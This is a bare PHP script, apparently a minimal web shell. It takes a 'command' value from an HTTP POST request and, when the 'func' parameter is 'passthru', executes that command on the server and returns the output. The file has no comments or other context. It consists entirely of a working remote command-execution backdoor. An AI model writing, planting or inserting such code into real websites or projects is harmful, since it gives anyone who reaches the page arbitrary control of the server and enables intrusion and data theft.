<?php
$execfunc = $_POST['func'];
if  ($_POST['command'] )  { 
    if ($execfunc=="passthru")
        passthru($_POST['command']); 
} 
?>